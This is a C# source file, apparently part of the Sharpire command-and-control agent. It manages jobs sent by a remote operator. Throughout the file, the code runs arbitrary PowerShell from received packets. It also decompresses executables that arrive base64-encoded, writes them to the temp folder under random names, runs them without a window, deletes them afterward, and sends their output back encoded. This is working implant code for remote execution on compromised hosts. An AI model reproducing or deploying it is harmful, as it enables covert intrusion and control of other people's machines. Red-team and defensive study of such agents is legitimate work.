using System;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.IO;
using System.Linq;
using System.Threading;

namespace Sharpire
{
    public class JobTracking
    {
        public Dictionary<string, Job> jobs;
        public Dictionary<string, ushort> jobsId;

        public JobTracking()
        {
            jobs = new Dictionary<string, Job>();
            jobsId = new Dictionary<string, ushort>();
        }

        internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
        {
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (KeyValuePair<string, Job> job in jobs)
                {
                    string results = job.Value.GetOutput();
                    if (!string.IsNullOrEmpty(results))
                    {
                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                    }

                    if (job.Value.IsCompleted())
                    {
                        job.Value.KillThread();
                        job.Value.Status = "stopped";
                        jobsToRemove.Add(job.Key);
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
        }

        internal byte[] GetAgentJobsOutput(ref Coms coms)
        {
            byte[] jobResults = new byte[0];
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (string jobName in jobs.Keys)
                {
                    string results = jobs[jobName].GetOutput();
                    if (!string.IsNullOrEmpty(results))
                    {
                        jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
                    }

                    if (jobs[jobName].IsCompleted())
                    {
                        jobs[jobName].KillThread();
                        jobs[jobName].Status = "stopped";
                        jobsToRemove.Add(jobName);
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
            return jobResults;
        }

        internal void StartAssemblyJob(Coms.PACKET packet, ushort taskId)
        {
            string taskIdString = taskId.ToString();

            lock (jobs)
            {
                if (!jobs.ContainsKey(taskIdString))
                    jobs.Add(taskIdString, new Job());
            }

            lock (jobsId)
            {
                if (!jobsId.ContainsKey(taskIdString))
                    jobsId.Add(taskIdString, taskId);
            }

            jobs[taskIdString].StartAssembly(packet.data);
        }

        internal void StartAgentJob(string command, ushort taskId)
        {
            string taskIdString = taskId.ToString();
            lock (jobs)
            {
                if (jobs.ContainsKey(taskIdString))
                {
                    jobs[taskIdString].UpdateCommand(command);
                }
                else
                {
                    jobs.Add(taskIdString, new Job(command));
                }
            }
            lock (jobsId)
            {
                if (!jobsId.ContainsKey(taskIdString))
                {
                    jobsId.Add(taskIdString, taskId);
                }
            }
        }

        public class Job
        {
            private Thread JobThread { get; set; }
            private Queue<string> outputQueue = new Queue<string>();
            private bool isFinished = false;
            public string Status { get; set; }
            public string Language { get; set; }
            public Thread Thread { get; set; }
            public PowershellDetails Powershell { get; set; }
            private readonly object syncLock = new object();
            private string command;

            public Job()
            {
                // Default constructor for initialization
            }

            public Job(string command)
            {
                Status = "running";
                this.command = command;
                StartJob();
            }

            private void StartJob()
            {
                JobThread = new Thread(RunPowerShell);
                JobThread.Start();
            }

            public void UpdateCommand(string newCommand)
            {
                lock (syncLock)
                {
                    command = newCommand;

                    if (JobThread != null && JobThread.IsAlive)
                    {
                        JobThread.Abort();
                    }
                    StartJob();
                }
            }

            public void RunPowerShell()
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (PowerShell psInstance = PowerShell.Create())
                    {
                        psInstance.Runspace = runspace;
                        psInstance.AddScript(command);

                        PSDataCollection<PSObject> outputCollection = new PSDataCollection<PSObject>();
                        outputCollection.DataAdded += (sender, e) =>
                        {
                            lock (syncLock)
                            {
                                while (outputCollection.Count > 0)
                                {
                                    PSObject data = outputCollection[0];
                                    if (data != null)
                                    {
                                        outputQueue.Enqueue(data.ToString());
                                    }
                                    outputCollection.RemoveAt(0);
                                }
                            }
                        };

                        try
                        {
                            IAsyncResult result = psInstance.BeginInvoke<PSObject, PSObject>(null, outputCollection);

                            while (!result.IsCompleted || outputCollection.Count > 0)
                            {
                                Thread.Sleep(200);
                            }
                        }
                        catch (Exception error)
                        {
                            lock (syncLock)
                            {
                                string errorMessage = "[-] Error: " + error.Message;
                                outputQueue.Enqueue(errorMessage);
                            }
                        }
                        finally
                        {
                            lock (syncLock)
                            {
                                isFinished = true;
                            }
                        }
                    }
                }
            }


            public bool IsCompleted()
            {
                lock (syncLock)
                {
                    if (JobThread != null && JobThread.IsAlive)
                    {
                        if (isFinished && outputQueue.Count == 0)
                        {
                            Status = "completed";
                            return true;
                        }
                        return false;
                    }
                    else
                    {
                        Status = "completed";
                        return true;
                    }
                }
            }

            public string GetOutput()
            {
                lock (syncLock)
                {
                    StringBuilder sb = new StringBuilder();
                    while (outputQueue.Count > 0)
                    {
                        sb.AppendLine(outputQueue.Dequeue());
                    }
                    string result = sb.ToString();

                    outputQueue.Clear();
                    return result;
                }
            }

            public void KillThread()
            {
                if (JobThread != null)
                {
                    JobThread.Abort();
                    Status = "stopped";
                }
            }
            public void StartAssembly(string packetData)
            {
                Status = "running";
                command = packetData;

                JobThread = new Thread(RunAssemblyInProcess);
                JobThread.IsBackground = true;
                JobThread.Start();
            }
            
            private static string[] ParseJsonParams(string jsonString)
            {
                var parametersList = new List<string>();

                jsonString = jsonString.Trim('{', '}');
                string[] keyValuePairs = jsonString.Split(',');

                foreach (string pair in keyValuePairs)
                {
                    string[] keyValue = pair.Split(new[] { ':' }, 2);
                    if (keyValue.Length == 2)
                    {
                        string value = keyValue[1].Trim().Trim('"');
                        parametersList.Add(value);
                    }
                }

                return parametersList.ToArray();
            }
            
            private static string EscapeArg(string arg)
            {
                if (string.IsNullOrEmpty(arg))
                    return "\"\"";

                // Escape quotes and wrap if needed
                if (arg.Contains(" ") || arg.Contains("\""))
                    return "\"" + arg.Replace("\"", "\\\"") + "\"";

                return arg;
            }
            
            private static void AssemblyJobMaterialize(string packetData, out string exePath, out string args)
            {
                string[] parts = packetData.Split(',');

                string jsonString = Encoding.UTF8.GetString(Convert.FromBase64String(parts[1]));
                string[] parameters = ParseJsonParams(jsonString);

                byte[] compressedBytes = Convert.FromBase64String(parts[0]);
                byte[] decompressedBytes = Coms.Decompress(compressedBytes);

                exePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".exe");
                File.WriteAllBytes(exePath, decompressedBytes);

                args = string.Join(" ", parameters.Select(EscapeArg).ToArray());
            }

            private void RunAssemblyInProcess()
            {
                string exePath = null;

                try
                {
                    string args;
                    AssemblyJobMaterialize(command, out exePath, out args);

                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = exePath,
                        Arguments = args,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    };

                    using (var p = new System.Diagnostics.Process { StartInfo = psi })
                    {
                        p.OutputDataReceived += (_, e) => { if (e.Data != null) EnqueueLine(e.Data); };
                        p.ErrorDataReceived  += (_, e) => { if (e.Data != null) EnqueueLine("[stderr] " + e.Data); };

                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        p.WaitForExit();
                        p.WaitForExit(1000); // helps flush last async lines
                    }
                }
                catch (Exception ex)
                {
                    EnqueueLine($"[ERROR] {ex.GetType().Name}: {ex.Message}");
                    lock (syncLock) { Status = "error"; }
                }
                finally
                {
                    if (!string.IsNullOrEmpty(exePath))
                    {
                        try { System.IO.File.Delete(exePath); } catch { }
                    }

                    lock (syncLock)
                    {
                        isFinished = true;
                        if (Status != "error") Status = "completed";
                    }
                }
            }

            private void EnqueueLine(string line)
            {
                lock (syncLock) { outputQueue.Enqueue(line); }
            }
        }
        public class PowershellDetails
        {
            public object AppDomain { get; set; }
            public object PsHost { get; set; }
            public object Buffer { get; set; }
            public object PsHostExec { get; set; }
        }
    }
}